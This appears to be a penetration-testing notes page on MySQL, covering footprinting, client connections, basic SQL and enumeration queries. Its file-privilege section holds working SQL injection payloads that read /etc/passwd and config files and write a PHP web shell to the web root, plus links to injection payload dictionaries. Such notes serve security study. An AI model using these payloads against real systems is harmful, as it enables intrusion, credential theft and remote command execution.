---
title: MySQL
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - database
  - relational database
  - SQL
---
# MySQL

!!! tip "Related resources"
	- [Detailed SQLi Cheat sheet for manual attack](sqli-manual-attack.md).
	- [SQL injection](webexploitation/sql-injection.md)
	- [NoSQL injection](webexploitation/nosql-injection.md)
	- [SQL injections](webexploitation/sqlite-injections.md)


??? example "Languages and dictionaries"
	| Server | Dictionary |
	| -- | -- |
	|  [MySQL](mysql.md) | [MySQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MySQL%20Injection.md). | 
	| [MSSQL](mssql.md) | [MSSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MSSQL%20Injection.md). |
	|  [PostgreSQL](5432-postgresql.md) | [PostgreSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/PostgreSQL%20injection.md). |
	|  [Oracle](1521-oracle-transparent-network-substrate.md) | [Oracle SQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Oracle-SQL-injections.md). |
	| [SQLite](webexploitation/sqlite-injections.md) | [SQLite payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/SQLite-injection.md). | 
	| Cassandra | [Cassandra payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Cassandra%20Injection.md). | 

??? example "Attack-based dictionaries"
    - [Generic SQL Injection Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/generic-injections)
    - [Generic Error Based Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based).
    - [Generic Union Select Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/union-select).
    - [SQL time based payloads ](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/time-based).
    - [SQL Injection Auth Bypass Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/auth-bypass) 



**MySQL**: MySQL is an open-source relational database management system(RDBMS) based on Structured Query Language (SQL). It is developed and managed by oracle corporation and initially released on 23 may, 1995. It is widely being used in many small and large scale industrial applications and capable of handling a large volume of data. After the acquisition of MySQL by Oracle, some issues happened with the usage of the database and hence MariaDB was developed.

By default, MySQL uses [`TCP/3306`](3306-mariadb-mysql.md).

## Authentication Mechanisms

MySQL  supports different authentication methods, such as username and password, as well as Windows authentication (a plugin is required).

`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

## Footprinting mysql

```shell-session
sudo nmap $ip -sV -sC -p3306 --script mysql*
```

## Connect to database: mysql 

### From Linux

```bash
mysql -u username -pPassword123 -h $ip 
# -h host/ip   
# -u user As default mysql has a root user with no authentication

mysql --host=INSTANCE_IP --user=root --password=thepassword
mysql -h <host/IP> -u root -p<password>
mysql -u root -h <host/IP>

mysql -u root -h example.com -P 3306 -pPassword123
# -P: port
```

#### sqsh

```shell-session
# Targeting a local account:
sqsh -S $ip -U <username> -P 'MyPassword!' -h

# Targeting Windows authentication
sqsh -S $ip -U .\\username -P 'MyPassword!' -h
# -h: disable headers and footers for a cleaner look.
```

#### mssqlclient.py from impacket 

```bash
mssqlclient.py -p $port username@$ip 
```

If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.

```bash
python3 mssqlclient.py Administrator@$ip -windows-auth  
# With python3 mssqlclient.py help you can see more options.
```


### From Windows

#### mysql.exe

```powershell
mysql.exe -u username -pPassword123 -h $IP
```

#### sqlcmd

```powershell
sqlcmd -S <server> -U <username> -P 'MyPassword!' -y 30 -Y 30
# When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
```


### From GUI Application

#### Server Management Studio or SSMS

Download from: [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms)


#### MySQL Workbench

Download from: [https://dev.mysql.com/downloads/workbench/](https://dev.mysql.com/downloads/workbench/).
#### dbeaver 

[dbeaver](https://github.com/dbeaver/dbeaver) is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.

To install [dbeaver](https://github.com/dbeaver/dbeaver) using a Debian package we can download the release .deb package from [https://github.com/dbeaver/dbeaver/releases](https://github.com/dbeaver/dbeaver/releases) and execute the following command:

```
sudo dpkg -i dbeaver-<version>.deb

# run dbeaver in a second plane
 dbeaver &
```


## Basic commands

![SQL](img/sql_00.png)

![SQL](img/sql_01.png)


```sql
# Example:
SELECT * FROM tableName WHERE username != 'john' AND id > 1;
```

Additionally there are two strings that you can use to comment a line in SQL:

- `#` The hash symbol.
- `--`The two dashes followed by a space-

```mysql
# Show datases
SHOW databases;

# Show tables
SHOW tables;

# Create new database
CREATE DATABASE nameofdatabase;

# Delete database
DROP DATABASE nameofdatabase;

# Select a database
USE nameofdatabase;

# Show tables
SHOW tables;

# DESCRIBE keyword is used to list the table structure with its fields and data types:
DESCRIBE nameoftable;

# Dump columns from nameOftable
SELECT * FROM NameOfTable;
# SELECT name, description FROM products WHERE id=9;

# Another useful SQL clause is LIKE, enabling selecting records by matching a certain pattern. The query below retrieves all records with usernames starting with admin. The % symbol acts as a wildcard and matches all characters after admin. It is used to match zero or more characters. 
SELECT * FROM logins WHERE username LIKE 'admin%';

SELECT * FROM logins WHERE username NOT LIKE 'Bear';



# Create a table with some columns in the previously selected database
CREATE TABLE person(nombre VARCHAR(255), edad INT, id INT);

# Modify, add, or remove a column attribute of a table
ALTER TABLE persona DROP edad VARCHAR(200);
ALTER TABLE persona ADD edad VARCHAR(200);

#  `NOT NULL` constraint ensures that a particular column is never left empty
ALTER TABLE persona MODIFY id INT NOT NULL AUTO_INCREMENT;

# `UNIQUE` constraint to ensure that the inserted item are always unique
ALTER TABLE persona MODIFY nombre VARCHAR(100) UNIQUE NOT NULL;

# Another important keyword is the `DEFAULT` keyword, which is used to specify the default value. `Now()` in MySQL returns the current date and time:
ALTER TABLE persona ADD date_of_joining DATETIME DEFAULT NOW();

# `PRIMARY KEY`, which we can use to uniquely identify each record in the table
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );

# Finally, We can use ALTER to change the name of any table and any of its fields or to delete or add a new column to an existing table. T
ALTER TABLE tableName ADD newColumn INT;

# We can also rename a column:
ALTER TABLE tableName RENAME COLUMN newColumn TO oldColumn;

# Or delete a column: 
ALTER TABLE tableName DROP oldColumn;

# Insert a new row with values in a table
# INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
INSERT INTO persona VALUES("alvaro", 54, 1);

# Insert a new row with values in a table, but skipping some columns
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);

# We can also insert multiple records at once by separating them with a comma:
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');

# Show all columns from table
SELECT * FROM tableName

# Show only some columns from the table
SELECT column1,column2 FROM tableName

# Select a row from a table filtering by the value of a given column
SELECT * FROM persona WHERE nombre="alvaro";

# JOIN query
SELECT * FROM oficina JOIN persona ON persona.id=oficina.user_id;

# UNION query. This means, for an attack, that the number of columns has to be the same
SELECT * FROM oficina UNION SELECT * from persona;

# Sorting data on the bases on edad column
SELECT * FROM persona ORDER BY edad;

# Retrieving first record from the table.
SELECT * from persona order by edad limit 1;

# Count the number of people stored in persona
SELECT count(*) from persona;

# Context: a wordpress database
# Identify how many distinct authors have published a post in the blog
SELECT DISTINCT(post_author) from wpdatabase.wp_posts;

# Remove tables and databases from server
DROP TABLE tableName;

# the UPDATE statement can be used to update specific records within a table, based on certain conditions. Its general syntax is:
UPDATE tableName SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;

```


```MySQL
# UNION Statement syntax
#<SELECT statement> UNION <other SELECT statement>;
# Example:
SELECT name, description FROM products WHERE id=9 UNION SELECT price FROM products WHERE id=9;
```


## Enumeration queries 

```mysql
# Show current user
current_user()
user()

SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

# Show current database
database()

# we can test if we have super admin privileges with the following query:
SELECT super_priv FROM mysql.user
# This in a UNION query would be (example):
# cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
# Another example:
# cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

# Dump privileges:
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
# As an example in an UNION query payload:
# cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -


```


###  `FILE` privilege enabled: Upload a shell

If our user has the `FILE` privilege enabled, they can read and potentially write files:

The [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files.

```sql
SELECT LOAD_FILE('/etc/passwd');
# Example of the payload in an UNION attack:
# cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
# Another example:
# cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -

```


**Write Files. To be able to write files to the back-end server using a MySQL database, we require three things:**

**1.** User with `FILE` privilege enabled. If our user is root:

```sql
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

**2.**  MySQL global `secure_file_priv` variable not enabled

```sql
SHOW VARIABLES LIKE 'secure_file_priv';

# Final SQL query
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

# In an example of an UNION query attack:
# cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

```

The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege. However, `MySQL` uses `/var/lib/mysql-files` as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings.

**3.**  Write access to the location we want to write to on the back-end server. The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';

# This will create a test.txt file owned by the mysql user
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

# Example in an UNION injection attack:
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

**Tip**: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

**4.** Uploading a shell. This is a PHP shell:

```php
<?php system($_REQUEST[0]); ?>
```

Let's replicate the UNION injection attack:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:

```html
https://$ip:$port/shell.php?0=id
```


## Well-know vulnerabilities

### Misconfigurations

Anonymous access enabled.

### Vulnerabilities

`MySQL 5.6.x` servers:  [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) , among others. It allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the `timing attack` vulnerability existed in the way MySQL handled authentication attempts. In this timing attack, MySQL repeatedly attempts to authenticate to a server and measures the time it takes for the server to respond to each attempt. By measuring the time it takes the server to respond, we can determine when the correct password has been found, even if the server does not indicate success or failure.